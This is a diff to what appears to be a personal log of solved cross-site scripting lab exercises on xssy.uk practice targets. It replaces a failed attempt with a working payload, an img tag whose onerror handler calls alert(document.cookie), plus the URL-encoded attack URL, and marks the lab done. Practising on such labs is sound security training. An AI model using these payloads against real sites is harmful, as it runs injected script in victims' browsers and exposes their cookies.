@@ -561,13 +561,13 @@ https://77my5mnd.hacky.uk/target.ftl?name%3Csvg%20onload%3Dalert(document.cookie
 - **URL Lab**: https://xssy.uk/lab/1072
 - **Payload**: 
 ```
-what<svg\u003E<script\u003E
+<img src=x onerror=alert(document.cookie) 
 ```
 - **Full URL**: 
 ```
-https://dl5kmrls.xssy.uk/target.ftl?name=what%3Csvg\u003E%3Cscript\u003E
+https://dl5kmrls.hacky.uk/target.ftl?name=%3Cimg%20src%3Dx%20onerror=alert%28document.cookie%29%20
 ```
-- **Status**: I have no clue
+- **Status**: Done
 
 ---
 
